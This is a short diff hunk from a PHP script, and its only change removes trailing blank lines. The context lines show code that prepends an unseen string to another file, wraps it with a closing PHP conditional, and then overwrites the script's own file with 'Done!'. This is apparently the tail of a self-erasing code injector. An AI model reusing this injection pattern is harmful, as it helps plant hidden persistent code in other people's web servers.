@@ -6,5 +6,3 @@
     file_put_contents($base, $str . file_get_contents($base) . "?><?php } ?>");
 
     file_put_contents(__FILE__, 'Done!');
-
-    
